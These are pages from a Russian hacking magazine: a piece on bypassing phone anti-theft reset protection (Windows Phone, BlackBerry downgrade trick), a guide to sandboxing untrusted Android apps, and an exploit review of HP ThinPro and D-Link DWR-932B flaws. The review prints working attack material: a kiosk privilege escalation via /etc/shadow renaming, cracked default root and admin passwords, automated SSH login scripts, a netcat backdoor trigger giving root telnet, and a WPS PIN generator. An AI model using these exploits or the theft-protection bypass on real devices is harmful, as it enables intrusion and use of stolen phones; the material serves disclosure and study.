     Доля Windows в телефонах — менее 4%. Интерес к этим устройствам со сто-
     роны воришек невелик, особенно с учетом того, что подавляющее большин-
      ство таких устройств на руках пользователей — откровенные бюджетники.
       Тем не менее и для них компания Microsoft предусмотрела защиту от ап-
     паратного сброса — но только там, где это требуется по закону. А требует-
     ся пока только на территории Соединенных Штатов, так что описанные в этой
      статье пункты меню ты в своем устройстве, скорее всего, не увидишь неза-
     висимо от версии Windows: защита от аппаратного сброса активируется или
     не активируется в смартфонах Microsoft в момент производства.
        Согласно документам Microsoft мобильная Windows предлагает два мех-
     низма защиты:
      •  Reset and reactivation protection — украденное устройство невозможно ис-
        пользовать без ввода пароля от Microsoft Account до сброса. Даже полная
        перепрошивка устройства средствами WDRT не поможет злоумышленнику.
      •  Anti-rollback protection — защита от понижения версии прошивки. Здесь
        все не так просто: понизить версию прошивки в WRDT можно, но прошить
       версию без защиты от сброса (или Country Variant, в котором такой защиты
         нет) теоретически невозможно. «Теоретически» просто потому, что никто
        не пробовал: платформа мало распространена и интерес к ней со стороны
        исследователей слаб. На практике же идея с Country Variant вполне может
         сработать.

     Приблизительно так выглядит настройка защиты от аппаратного сброса
     (скриншот с одной из ранних сборок Windows 10 Mobile; на более поздних воз-
     можность стала недоступной для неамериканских устройств):





     Отключается защита стандартно: Find My Phone    Reset Protection    Off
     либо вводом пароля от Microsoft Account непосредственно перед сбросом
      устройства.
        Интересна возможность платформы отвязать телефон от Microsoft Account
     и отключить защиту от сброса через веб уже после того, как устройство было
     сброшено без отключения защиты (например, через WDRT). Для этого доста-
     точно зайти на страницу account.microsoft.com/devices со своим логином и па-
     ролем, после чего найти нужное устройство и... А вот и нет, просто удалить его
     из учетной записи недостаточно.
        Вот что нужно сделать:
       1. Зайти на account.microsoft.com/devices.
       2. Кликнуть Remove phone.
       3. Сохранить Recovery Key. Обязательно сохранить!
       4. Согласиться с сообщением I’m ready to remove my phone и удалить устрой-
         ство. На всякий случай Recovery Key тебе должны отправить по email.
       5. Подтвердить, что Recovery Key ты сохранил (I’ve kept a copy of the recovery
         key) и нажать ОK.
       6. Recovery Key нужно будет использовать для активации телефона после ап-
        паратного сброса использованием опции Disable using recovery key.

    Еще интересный момент: статус защиты устройства можно проверить по IMEI.
     При этом логин и пароль от Microsoft Account не нужны.

    BLACKBERRY 10
      •  Защита от сброса к заводским настройкам: да, на всех устройствах под
        управлением BlackBerry 10 10.3.2
      •  Удаленная блокировка: доступна на всех устройствах с момента выхода
       платформы
      •  Дата появления защиты от сброса: BlackBerry 10 OS версии 10.3.2 (июнь
       2015 года)
      •  География: по всему миру
      •  Защита от понижения версии прошивки: да, но можно обойти на всех сбор-
         ках за исключением 10.3.3 (которая официально еще не вышла)
      •  Для снятия защиты: разблокировать устройство, отключить BlackBerry
          Protect, ввести пароль от BlackBerry ID
      •  Альтернативный способ: произвести сброс к заводским настройкам через
        настройки телефона, ввести пароль от BlackBerry ID. Отключение после
        сброса: зайти на https://protect.blackberry.com/, Manage Devices, выбрать
        нужное устройство и нажать Remove. Защита будет отключена, и устройство
       можно будет активировать с новой учетной записью
      •  Актуальный статус: на большинстве устройств обходится без особых про-
       блем

     Телефоны BlackBerry подавались как самые безопасные устройства на рынке.
     Защита данных путем дистанционного сброса и блокировки устройства была
     доступна уже в момент выхода на рынок первых устройств:





    Но защита от активации после сброса к заводским настройкам появилась
      только в июне 2015 года с выходом BlackBerry 10 версии 10.3.2 (актуальная
     версия ОС и по сегодняшний день).
        Структура загрузчика BlackBerry 10 такова, что обойти систему защиты или
     мастер активации при помощи манипуляций, подобных тем, что мы видели
     в Android, не представляется возможным. Идеальная схема защиты? Как ока-
      залось, нет.

     Следи за руками
      Раз. Защита от аппаратного сброса появилась в ОС 10.3.2. Более ранние вер-
     сии (доступные, к слову, для всех устройств линейки) такой защиты не имели.
     Откатиться к более ранней сборке — никакая не проблема, если использовать
      автозагрузчик (простой исполняемый файл, который уже содержит все необ-
     ходимые драйверы и собственно прошивку).
        Два. В BlackBerry сидят не совсем дураки, и защиту от понижения версии
     прошивки предусмотрели — именно начиная с ОС 10.3.2. Откатиться на бо-
     лее старую версию ОС ты не сможешь.
      И три. Одна из альфа-версий прошивок для разработчиков, какое-то время
     доступная для скачивания с сайта BlackBerry, декларирует номер сборки, бо-
     лее высокий по сравнению с любой актуальной версией ОС 10.3.2. При этом
     никакой защиты от аппаратного сброса в альфа-сборке нет. Шах и мат: до-
     статочно зайти на любой тематический форум, посвященный смартфонам
      BlackBerry, и ты найдешь работающую ссылку на пресловутую прошивку. Да, их
      удаляют, но пользователи продолжают их выкладывать.
       К слову, все сказанное никак не относится к телефонам BlackBerry под
     управлением Android.

   ЗАКЛЮЧЕНИЕ
     Невозможно сделать систему защиты сильнее, чем ее самое слабое зве-
      но. В случае с BlackBerry достаточно было обнаружить прошивку (сделанную
     и опубликованную самой BlackBerry), на которую можно перейти для обхода
     защиты. Android — вечная тема для шуток; безопасности за редкими исклю-
     чениями на этой платформе нет. Не один баг, так другой, брешь всегда на-
      ходится. С Windows Phone сложнее: загрузчики на некоторых моделях можно
     разблокировать и защиту от сброса при некотором умении обойти, но стоит
     ли овчинка выделки — непонятно. А самая популярная цель для воришек всех
     мастей — Apple iPhone — сияет в гордом одиночестве: защиту от аппаратно-
      го сброса на относительно свежих поколениях устройств, хоть что-то стоящих
     в глазах воришек, обойти не получится без аппаратного вмешательства.
       Наши рекомендации пользователям Android: если защита от аппаратного
     сброса есть — используй ее. Включи блокировку экрана, отключи Smart Lock,
     активируй шифрование. Не брезгуй обновлениями прошивок и патчами безо-
      пасности. Украли телефон? Звони в полицию, звони провайдеру — пусть вне-
      сут его IMEI в черный список, блокируй телефон удаленным способом или сра-
      зу стирай данные. Дальнейшее от тебя не зависит.
MOBILE





                                                                            Евгений Зобнин
                                                                                          zobnin@gmail.com


  КАРАНТИН
ДЛЯ МАЛВАРИ
    ЗАПУСКАЕМ НЕБЕЗОПАСНЫЙ СОФТ
   БЕЗ УГРОЗЫ УТЕЧКИ ЛИЧНЫХ ДАННЫХ




О безопасности Android, точнее ее отсутствии, ходят ле-
генды. В операционке регулярно обнаруживают баги, ста-
вящие под угрозу десятки миллионов устройств, Play Store
постоянно превращается в площадку распространения
малвари, сторонние магазины софта битком набиты троя-
нами. В общем, здесь весело. Но что делать нам, рядовым
пользователям смартфонов? Если ставить проверенные
приложения из Play Store, можно быть в относительной
безопасности, ну а если без приложения из сомнительно-
го источника не обойтись?

Допустим, у тебя есть приложение, которое нужно обязательно протести-
ровать на реальном устройстве. Приложение не вызывает доверия, поэто-
му в идеале его лучше запустить на каком-нибудь старом и неиспользуемом
устройстве. Но, как это обычно и бывает, обстоятельства сложились не в твою
пользу, и, кроме рабочего смартфона с массой личной информации, под ру-
кой ничего нет.
   Что ж, тогда придется обходиться тем, что есть.

ГОСТЕВОЙ РЕЖИМ
Самый простой вариант запустить подозри-
тельное приложение, не скомпрометиро-
вав свои данные, банковские и мобильные
счета, — это использовать так называемый
многопользовательский режим (Настройки
   Пользователи). Он появился в Android 5.0
(на самом деле был доступен еще в версии
4.2, но только для планшетов) и позволяет
создать специальный аккаунт юзера с уре-
занными полномочиями.
   Такой юзер не будет иметь доступ к уста-
новленным основным пользователем при-
ложениям и их настройкам, не сможет за-
глянуть в его данные приложений и файлы,
подключенные  аккаунты  (например,  что-
бы установить приложение из Play Store,
придется логиниться с новой учетки). Так
что в целом все будет выглядеть как только
что установленный и еще не настроенный
Android, но с некоторыми ограничениями:
•  запрет на звонки и отправку СМС (можно
   отключить, нажав на шестеренку рядом
                                               Добавляем нового пользователя
   с именем пользователя и включив опцию
   «Включение звонков»);
•  запрет на включение режима разработчи-
   ка (Настройки  О телефоне   семь тапов по номеру сборки) и, как след-
   ствие, активацию ADB.

Если запустить под таким юзером зловредное приложение, оно не сможет
украсть информацию об основном пользователе, его данные, СМС, токены
авторизации или прочитать СМС от банка. У него не получится опустошить мо-
бильный счет с помощью отправки СМС на короткие номера.
   Это практически идеальный вариант запуска не вызывающего доверия со-
фта. Но есть и серьезная оговорка: если зловред найдет способ получить пра-
ва root, вся эта защита мигом рухнет. Имея права root, троян, вирус или что там
тебе попадется сможет сделать что угодно. Поэтому придется придумать что-
то более изощренное.

MULTIROM
MultiROM — это система, позволяющая ор-
ганизовать  на  смартфоне  полноценную
мультизагрузку. Ты скачиваешь и устанав-
ливаешь пакет из Play  Store, запускаешь
приложение, оно прошивает в девайс свой
загрузчик  (он  будет  отрабатывать после
оригинального загрузчика), ядро и консоль
восстановления. Далее ты можешь устано-
вить на смартфон любую прошивку рядом
с основной, будь то CyanogenMod, копия ос-
новной прошивки или даже Ubuntu Touch.
   У  MultiROM  грамотно  спроектирован-
ная архитектура, он не смешивает файлы
установленных прошивок с основной про-
шивкой, а вместо этого создает для каждой
из них несколько образов на карте памяти
(реальной или виртуальной — неважно), ко-
торые хранят прошивку и пользовательские
данные. Загрузчик подсовывает эти образы
прошивке во время ее старта вместо реаль-
ных NAND-разделов, поэтому она оказыва-
ется как бы замкнута в песочницу. Эта осо-
                                                       Инсталлируем MultiROM
бенность полностью защищает основную
прошивку даже в том случае, если в ней есть
root-доступ.
  В плане изоляции MultiROM значительно надежнее многопользовательско-
го режима, но тем не менее и в нем есть бреши. Самая странная из них состо-
ит в том, что если ты установишь на смартфон продвинутый троян, способный
не просто прописать себя в системные приложения, а внедриться в RAM-диск
(он содержит файлы, необходимые на начальном этапе загрузки ОС), то постра-
дает вовсе не запущенная с помощью MultiROM прошивка, а твоя основная.
   Так происходит потому, что RAM-диск вместе с ядром хранятся в разделе
boot. Чтобы внедриться в RAM-диск, троян извлекает его образ из boot, моди-
фицирует и записывает обратно. Но так как установленная второй системой
прошивка загружается из образа boot на карте памяти, она остается незара-
женной, а под раздачу попадает прошивка основная. К слову, удалить такой тро-
ян довольно легко: достаточно перезаписать раздел boot с помощью того же
MultiROM (поставить галочку напротив пункта «Ядро» и нажать «Установить»).
   Кстати, троян из второй прошивки вполне может получить доступ и к данным
основной прошивки, но для этого ему необходимо найти нужный NAND-раздел
и смонтировать его. К счастью, вирусы, умеющие это делать, не существуют
в природе и вряд ли когда-то появятся.

ОБРЕЗАЕМ ПРИВИЛЕГИИ
Еще один, менее, скажем так, инвазивный способ защиты от небезопасных
приложений — это контроль полномочий. Он хорошо подходит, если ты име-
ешь дело не с трояном или вирусом, а с рядовым приложением, но все равно
не хочешь, чтобы оно получило доступ к твоему местоположению, контактам,
не смогло отправить СМС или совершить звонок.
  В Android функция контроля полномочий появилась в версии 6.0, и ты на-
верняка с ней хорошо знаком. Сразу после запуска или при переходе на опре-
деленный экран приложения ты видишь запрос на получение доступа к тем
или иным функциям смартфона. Разрешать или нет такой доступ — дело твое,
тем более что большинство приложений продолжат нормальную работу даже
без доступа к некоторым функциям.
  Но есть в этом механизме очень серьезный изъян: если разработчик со-
берет свое приложение, указав Target SDK 22, то есть намеренно обозначит
версию Android 5.1 как целевую, система контроля полномочий Android не сра-
ботает и ты не увидишь на экране запрос полномочий, они будут даны по умол-
чанию. И это даже не баг, это специально введенное исключение, необходи-
мое для совместимости со старым софтом.
   Обойти такое ограничение можно несколькими способами. В CyanogenMod
есть система жесткого контроля полномочий, которая позволяет лишать при-
ложения доступа к функциям смартфона без оглядки на совместимость. С ее
помощью можно отключить полномочия абсолютно любому приложению,
в том числе системному. Просто перейди в «Настройки   Конфиденциаль-
ность   Защищенный режим», выбери приложение из списка и долго удер-
живай на нем палец. Появится экран со списком полномочий, которые можно
отключить с помощью переключателей.
  Но имей в виду, что отзыв полномочий у приложений (особенно важных
для их работы) может привести к их некорректной работе или падению. Поэ-
тому, если ты не уверен, лучше не трогать полномочия, а сделать так, чтобы
приложение получало вместо актуальной персональной информации (журнал
звонков, контакты, СМС) случайно сгенерированные данные. Для этого доста-
точно просто тапнуть по приложению в списке, после чего значок щита справа
сменит цвет на зеленый. Также приложению можно запретить доступ в интер-
нет, это делается на экране контроля полномочий в самом низу.





                Контроль полномочий                Запрещаем приложениям до-
                в CyanogenMod                         ступ к персональным данным


Если нет CyanogenMod, но есть root, почти такую же систему принудительно-
го контроля полномочий можно получить, установив Xposed и модуль XPrivacy
для него.
  Еще один вариант — приложение LBE
Security Master. Это своего рода комбайн
для защиты  устройства со  всех  сторон,
с собственной системой контроля полно-
мочий, антивирусом, чистильщиком мусо-
ра и массой других функций. Официальная
версия приложения из маркета поддержива-
ет только китайский язык, но с 4PDA можно
скачать версию на русском.
  LBE начнет работать сразу после уста-
новки, так что уже при запуске приложений
ты увидишь на экране запрос полномочий,
при звонке на экране появится кнопка «До-
бавить в черный список», а иногда ты бу-
дешь получать уведомления о подозритель-
ных действиях. Самые полезные функции
находятся в разделе «Активная защита».
Здесь можно управлять полномочиями при-
ложения, открывать и закрывать доступ к ин-
тернету, убрать их из автозагрузки и даже
заблокировать рекламу.
   Все эти функции требуют root, но в LBE                                                 Управляем полномочиями с по-
также есть поддержка нерутованных смарт-    мощью LBE
фонов. Правда, работает она  несколько
по-другому. Для того чтобы получить воз-
можность управлять полномочиями и доступом в интернет, приложение необ-
ходимо добавить в так называемый «Изолятор» (он находится в выдвигающем-
ся меню). После этого оно будет работать под контролем LBE.

Безопасный режим

В чистой версии Android от Google (а так-
же во всех кастомных прошивках) есть
специальный режим на случай заражения
вирусами, блокировщиками экрана или
установки некорректно работающих при-
ложений. Работая в этом режиме, Android
отключает все установленные пользовате-
лем приложения и не позволяет им влиять
на работу системы. Перейти в этот режим
очень легко: удерживай кнопку включения,
пока не появится меню отключения пита-
ния, а затем удерживай пункт «Отключить
питание» до появления сообщения о пе-
реходе в безопасный режим.





ВЫВОДЫ
Разработчиков Android можно бесконечно упрекать в раздолбайстве и соз-
дании экосистемы, в которой процветает малварь. Но в конце концов,
он дает большую свободу выбора, и именно на тебе лежит ответственность
за то, чем ты заражаешь смартфон. Автор этих строк использует смартфоны
на Android с версии 1.1 и ни разу за все это время не подхватил ни одного
вируса. А вот намеренно заражал не раз, и каждый раз MultiROM и много-
пользовательский режим отлично справлялись с задачей изоляции вируса
от основной системы.
ВЗЛОМ





                                                                               Борис Рютин,
                                                                                                                              Digital Security
                                                                                                        b.ryutin@dsec.ru
                                                                                       @dukebarman
     WARNING                                                                       dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





   Сегодня мы разберем очередную уязвимость в роутере D-Link.
  На этот раз дыру нашли в прошивке модели DWR-932B, и о патче
   для нее на момент написания статьи ничего не известно. Также
рассмотрим небольшую (по сложности, а не по разрушительной силе)
          уязвимость в тонких клиентах на HP ThinPro OS.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ В HP THINPRO OS

 CVSSv2:     Нет
 Дата релиза: 3 октября 2016 года
 Авторы:      @malerisch и @vhutsebaut
 CVE:         CVE-2016-2246

В HP ThinPro OS sudo сконфигурирован таким образом, что позволяет неавто-
ризованному пользователю с помощью утилиты Keyboard Layout провести атаку
типа «повышение привилегий» и получить доступ с правами администратора.
   Keyboard Layout (находится в /usr/bin/hptc-keyboard-layout) запуска-
ется как привилегированный процесс и при этом доступен любому пользова-
телю из интерфейса HP ThinPro Kiosk. Такой пользователь может исследовать
систему и восстановить оригинальный файл /etc/shadow, который позволит
установить новый пароль администратора в системе.

EXPLOIT
Для успешной эксплуатации у атакующего должен быть физический доступ к HP
Thin OS Pro в режиме Kiosk. При этом предполагается, что у него нет аккаунта, и
он не знает пароль администратора, но админский пароль при этом задан в си-
стеме..
   Для воспроизведения уязвимости открой панель управления приложения-
ми и выбери пункт Keyboard Layout (расположение кнопки и вид интерфейса
могут различаться в разных версиях системы, но эта утилита доступна любым
пользователям в режиме Kiosk).





             Пример интерфейса панели управления и расположения Keyboard Layout

Далее нужно кликнуть на иконку Print File, чтобы вызвать диалоговое окно.





                                                Расположение иконки Print File

Теперь нам нужно открыть диалоговое окно (значок с тремя точками) для выбо-
ра расположения файла output  file. Так как это приложение работает с пра-
вами администратора, то мы можем путешествовать по системе через запу-
щенное диалоговое окно без каких-либо проблем.
   Чтобы получить нормальный доступ администратора, перейдем в директо-
рию /etc/ и переименуем файлы:
•  /etc/shadow в /etc/shadow-last-modified-by-admin;
•  /etc/shadow- в /etc/shadow.

Затем переключим пользователя на администратора, и у нас появится окно
установки нового пароля. Выбирай, какой тебе милее, и доступ к режиму ад-
министратора Kiosk получен!





                                Меню переключения между пользователями

Интерфейс изменится, но, помимо этого, ты можешь запустить терминал
для проверки доступных команд.





                               Запущенный xterminal с правами администратора


Авторы эксплоита записали видео с демонстрацией уязвимости.

TARGETS
HP ThinPro OS (HP ThinPro 4.4, HP ThinPro 5.0, HP ThinPro 5.1, HP ThinPro 5.2, HP
ThinPro 5.2.1, HP ThinPro 6.0, HP ThinPro 6.1).

SOLUTION
Производитель выпустил исправление.


МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ В D-LINK DWR-932B

 CVSSv2:     Нет
 Дата релиза: 28 сентября 2016 года
 Автор:        @PierreKimSec (https://twitter.com/pierrekimsec)
 CVE:         нет





                                                          Роутер D-Link DWR-932





D-Link DWR-932B — это LTE-роутер, который продается по всему миру и отли-
чается изрядным количеством уязвимостей. Он основан на известной модели
роутеров компании Quanta, что позволило ему унаследовать некоторые дыры
от старшего собрата. Небольшой обзор уязвимостей в этом устройстве уже
публиковался ранее, но исправляют их не так быстро.
  Все исследования проводились на прошивке DWR-932_fw_revB_2_02_eu_
en_20150709.zip. Были найдены уязвимости следующих типов:
•  бэкдор-аккаунты;
•  бэкдор;
• WPS PIN по умолчанию;
•  слабая генерация WPS PIN;
•  утечка аккаунта No-IP;
•  многочисленные уязвимости в демоне HTTP (qmiweb);
•  удаленная загрузка прошивки (FOTA, Firmware Over The Air);
•  плохое решение по обеспечению безопасности;
•  удалена безопасность в UPnP.

Автор исследования пишет, что в лучшем случае такое количество уязвимостей
обусловлено просто некомпетентностью, в худшем — это закладки, сделанные
умышленно. Мы рассмотрим лишь самые интересные из них.

EXPLOIT
БЭКДОР-АККАУНТЫ
По умолчанию на роутере запущены telnetd и SSHd. При этом telnetd работает,
даже если об этом нет никакой информации.

user@kali:~$ cat ./etc/init.d/start_appmgr
...
#Sandro { for telnetd debug...
start-stop-daemon -S -b -a /bin/logmaster
#if [ -e /config2/telnetd ]; then
  start-stop-daemon -S -b -a /sbin/telnetd
#fi
#Sandro }
...

На устройстве есть два бэкдор-аккаунта, через которые можно обойти HTTP-ау-
тентификацию, используемую для управления устройством.

admin@homerouter:~$ grep admin /etc/passwd
admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
admin@homerouter:~$

Пароль для аккаунта admin — это, как ни смешно, admin. Информацию об этом
можно найти в файле /bin/appmgr, используя средства для реверсинга (автор
эксплоита использовал IDA).





                         Функция установки пароля admin для пользователя admin

Обнаружился и пользователь root:

user@kali:~$ cat ./etc/shadow
root:aRDiHrJ0OkehM:16270:0:99999:7:::
daemon:*:16270:0:99999:7:::
bin:*:16270:0:99999:7:::
sys:*:16270:0:99999:7:::
sync:*:16270:0:99999:7:::
games:*:16270:0:99999:7:::
man:*:16270:0:99999:7:::
lp:*:16270:0:99999:7:::
mail:*:16270:0:99999:7:::
news:*:16270:0:99999:7:::
uucp:*:16270:0:99999:7:::
proxy:*:16270:0:99999:7:::
www-data:*:16270:0:99999:7:::
backup:*:16270:0:99999:7:::
list:*:16270:0:99999:7:::
irc:*:16270:0:99999:7:::
gnats:*:16270:0:99999:7:::
diag:*:16270:0:99999:7:::
nobody:*:16270:0:99999:7:::
messagebus:!:16270:0:99999:7:::
avahi:!:16270:0:99999:7:::
user@kali:~$

Загружаем хеш в старый добрый John the Ripper:

user@kali:~$ john -show shadow+passwd
admin:admin:admin:/:/bin/sh
root:1234:16270:0:99999:7:::
2 password hashes cracked, 0 left
user@kali:~$

В результате получаем пары логин-пароль: admin:admin и root:1234. Весело
смеемся.
   Автор написал небольшой скрипт для автоматизации авторизации со стан-
дартным паролем на устройстве.

user@kali:~$ cat quanta-ssh-default-password-admin
#!/usr/bin/expect -f
set timeout 3
spawn ssh admin@192.168.1.1
expect "password: $"
send "admin\r"
interact
user@kali:~$ ./quanta-ssh-default-password-admin
spawn ssh admin@192.168.1.1
admin@192.168.1.1's password:
admin@homerouter:~$ id
uid=168(admin) gid=168(admin) groups=168(admin)
admin@homerouter:~$

Для root будет аналогично:

user@kali:~$ cat quanta-ssh-default-password-root
...
spawn ssh root@192.168.1.1
expect "password: $"
send "1234\r"
...
root@homerouter:~# id
uid=168(root) gid=168(root) groups=168(root)
root@homerouter:~#

БЭКДОР
Бэкдор содержится в приложении /bin/appmgr. Если устройству отправить
специальную строку по протоколу UDP, то запустится сервер Telnet (без аутен-
тификации!), если он еще не был запущен.
  В /bin/appmgr запускается поток, который слушает 0.0.0.0:39889 (UDP)
и ждет команды. Если клиент отправит HELODBG, то роутер выполнит команду
/sbin/telnetd -l /bin/sh и выдаст доступ на устройстве с правами root
без авторизации.
   Бэкдор находится в главной функции (строка 369). Ты можешь посмотреть
на него сам, открыв этот файл в IDA.





                                                        Бэкдор в /bin/appmgr

Пример использования:

user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
Hello
^C
user@kali:~$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
OpenEmbedded Linux homerouter.cpe
msm 20141210 homerouter.cpe
/ # id
uid=0(root) gid=0(root)
/ # exit
Connection closed by foreign host.

WPS PIN ПО УМОЛЧАНИЮ
Wi-Fi Protected Setup (WPS) — это стандарт для легкого и «безопасного» созда-
ния домашней беспроводной сети. Процесс описан в документации к роутеру
(help.html).
  По умолчанию PIN для WPS всегда 28296607. Он действительно зашит в про-
грамму /bin/appmgr.





                                                        Вшитый PIN
                                                                 на устройстве

PIN также можно найти в настройках HostAP либо используя утечку информа-
ции в HTTP API:

root@homerouter:~# ps -a|grep hostap
  1006 root       0:00 hostapd /var/wifi/ar6k0.conf
  1219 root       0:00 grep hostap
root@homerouter:~# cat /var/wifi/ar6k0.conf
...
ap_pin=28296607
...

СЛАБАЯ ГЕНЕРАЦИЯ WPS PIN
Пользователь может зайти через веб-интерфейс и сгенерировать временный
PIN для WPS. Этот PIN слаб, а для генерации используется странный алгоритм.
Ниже представлен пример программы для его получения (автор восстановил
алгоритм посредством реверсинга).

user@kali:~$ cat quanta-wps-gen.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(int    argc,
         char   **argv,
         char   **envp)
{
  unsigned int  i0, i1;
  int           i2;
  /* Используется текущее время устройства, которое,
                 в свою очередь, использует NTP... */
  srand(time(0));
  i0 = rand() % 10000000;
  if (i0 <= 999999)
    i0 += 1000000;
  i1 = 10 * i0;
  i2 = (10 - (i1 / 10000 % 10 + i1 / 1000000 % 10 + i1 / 100 % 10
    + 3 * (i1 / 100000 % 10 + 10 * i0 / 10000000 % 10
      + i1 / 1000 % 10 + i1 / 10 % 10))
        % 10) % 10 + 10 * i0;
  printf("%d\n", i2 );
  return (0);
}
user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
user@kali:~$ ./dlink-wps-gen
97329329
user@kali:~$

Использование srand(time(0)) в качестве сида (seed) — это само по себе пло-
хая идея, потому что атакующий, зная текущую дату (time(0)!), сможет сгенериро-
вать правильный WPS PIN. Так как роутер использует NTP, значит, время настрое-
но правильно. Атакующий без проблем сгенерирует и подберет правильный WPS
PIN. Дизассемблерный код оригинального алгоритма из прошивки:

.text:0001B4D4        EXPORT generate_wlan_wps_enrollee_pin
.text:0001B4D4 generate_wlan_wps_enrollee_pin ;
   CODE XREF: wifi_msg_handle+194p
.text:0001B4D4
.text:0001B4D4 var_3C = -0x3C
.text:0001B4D4 var_38 = -0x38
.text:0001B4D4 s      = -0x34
.text:0001B4D4 var_30 = -0x30
.text:0001B4D4 var_2C = -0x2C
.text:0001B4D4
.text:0001B4D4        STMFD     SP!, {R4-R11,LR}
.text:0001B4D8        SUB       SP, SP, #0x1C
.text:0001B4DC        STR       R0, [SP,#0x40+s]
.text:0001B4E0        MOV       R0, #0  ; timer
.text:0001B4E4        BL        time
.text:0001B4E8        BL        srand
.text:0001B4EC        BL        rand
.text:0001B4F0        LDR       R4, =0x6B5FCA6B
.text:0001B4F4        MOV       R6, R0,ASR#31
.text:0001B4F8        SMULL     R1, R4, R0, R4
.text:0001B4FC        RSB       R10, R6, R4,ASR#22
.text:0001B500        RSB       R12, R10, R10,LSL#5
.text:0001B504        RSB       R2, R12, R12,LSL#6
.text:0001B508        ADD       R11, R10, R2,LSL#3
.text:0001B50C        LDR       R8, =0xF423F
.text:0001B510        ADD       R9, R11, R11,LSL#2
.text:0001B514        SUB       R1, R0, R9,LSL#7
.text:0001B518        CMP       R1, R8
.text:0001B51C        ADDLS     R1, R1, #0xF4000
.text:0001B520        ADDLS     R1, R1, #0x240
.text:0001B524        ADD       R3, R1, R1,LSL#2
.text:0001B528        MOV       R3, R3,LSL#1
.text:0001B52C        LDR       R1, =0xCCCCCCCD
.text:0001B530        LDR       R5, =0xA7C5AC5
.text:0001B534        LDR       R6, =0x6B5FCA6B
.text:0001B538        MOV       R7, R3,LSR#5
.text:0001B53C        UMULL     R4, R7, R5, R7
.text:0001B540        UMULL     R9, LR, R1, R3
.text:0001B544        UMULL     R5, R6, R3, R6
.text:0001B548        LDR       R12, =0xD1B71759
.text:0001B54C        MOV       R6, R6,LSR#22
.text:0001B550        UMULL     R10, R12, R3, R12
.text:0001B554        MOV       LR, LR,LSR#3
.text:0001B558        UMULL     R10, R9, R1, R6
.text:0001B55C        UMULL     R8, R10, R1, LR
.text:0001B560        LDR       R0, =0x431BDE83
.text:0001B564        MOV       R12, R12,LSR#13
.text:0001B568        UMULL     R11, R0, R3, R0
.text:0001B56C        STR       R10, [SP,#0x40+var_38]
.text:0001B570        UMULL     R8, R10, R1, R12
.text:0001B574        LDR       R2, =0x51EB851F
.text:0001B578        LDR       R4, =0x10624DD3
.text:0001B57C        UMULL     R5, R2, R3, R2
.text:0001B580        MOV       R0, R0,LSR#18
.text:0001B584        STR       R10, [SP,#0x40+var_3C]
.text:0001B588        UMULL     R8, R4, R3, R4
.text:0001B58C        UMULL     R8, R10, R1, R0
.text:0001B590        MOV       R2, R2,LSR#5
.text:0001B594        MOV       R7, R7,LSR#7
.text:0001B598        UMULL     R8, R11, R1, R7
.text:0001B59C        STR       R10, [SP,#0x40+var_30]
.text:0001B5A0        MOV       R4, R4,LSR#6
.text:0001B5A4        UMULL     R8, R10, R1, R2
.text:0001B5A8        UMULL     R8, R5, R1, R4
.text:0001B5AC        STR       R10, [SP,#0x40+var_2C]
.text:0001B5B0        MOV       R8, R9,LSR#3
.text:0001B5B4        MOV       R10, R11,LSR#3
.text:0001B5B8        ADD       R11, R10, R10,LSL#2
.text:0001B5BC        ADD       R9, R8, R8,LSL#2
.text:0001B5C0        MOV       R10, R5,LSR#3
.text:0001B5C4        LDR       R8, [SP,#0x40+var_38]
.text:0001B5C8        SUB       R6, R6, R9,LSL#1
.text:0001B5CC        SUB       R7, R7, R11,LSL#1
.text:0001B5D0        LDR       R9, [SP,#0x40+var_3C]
.text:0001B5D4        LDR       R11, [SP,#0x40+var_30]
.text:0001B5D8        ADD       R5, R10, R10,LSL#2
.text:0001B5DC        SUB       R5, R4, R5,LSL#1
.text:0001B5E0        LDR       R4, [SP,#0x40+var_2C]
.text:0001B5E4        MOV       R10, R8,LSR#3
.text:0001B5E8        MOV       R8, R9,LSR#3
.text:0001B5EC        MOV       R9, R11,LSR#3
.text:0001B5F0        ADD       R7, R7, R6
.text:0001B5F4        ADD       R10, R10, R10,LSL#2
.text:0001B5F8        ADD       R9, R9, R9,LSL#2
.text:0001B5FC        MOV       R11, R4,LSR#3
.text:0001B600        ADD       R8, R8, R8,LSL#2
.text:0001B604        ADD       R7, R7, R5
.text:0001B608        SUB       LR, LR, R10,LSL#1
.text:0001B60C        SUB       R5, R0, R9,LSL#1
.text:0001B610        SUB       R8, R12, R8,LSL#1
.text:0001B614        ADD       R11, R11, R11,LSL#2
.text:0001B618        ADD       R12, R7, LR
.text:0001B61C        SUB       R4, R2, R11,LSL#1
.text:0001B620        ADD       R8, R8, R5
.text:0001B624        ADD       R5, R8, R4
.text:0001B628        ADD       R0, R12, R12,LSL#1
.text:0001B62C        ADD       R4, R5, R0
.text:0001B630        UMULL     R5, R1, R4, R1
.text:0001B634        MOV       R2, R1,LSR#3
.text:0001B638        ADD       LR, R2, R2,LSL#2
.text:0001B63C        SUB       R8, R4, LR,LSL#1
.text:0001B640        LDR       R0, =0x66666667
.text:0001B644        RSB       R2, R8, #0xA
.text:0001B648        SMULL     R8, R0, R2, R0
.text:0001B64C        MOV       R12, R2,ASR#31
.text:0001B650        RSB       R1, R12, R0,ASR#2
.text:0001B654        ADD       LR, R1, R1,LSL#2
.text:0001B658        LDR       R12, =(aHostapd_conf_f - 0x1B670)
.text:0001B65C        SUB       R4, R2, LR,LSL#1
.text:0001B660        LDR       R2, =(aGet_wpspinI - 0x1B67C)
.text:0001B664        ADD       R4, R4, R3
.text:0001B668        ADD       R0, PC, R12 ; "hostapd_conf_file_gen"
.text:0001B66C        ADD       R0, R0, #0x3C
.text:0001B670        MOV       R1, #0x3B
.text:0001B674        ADD       R2, PC, R2 ; "Get_WpsPin:%in"
.text:0001B678        MOV       R3, R4
.text:0001B67C        BL          wifi_filelog
.text:0001B680        LDR       R1, =(a08lu - 0x1B690)
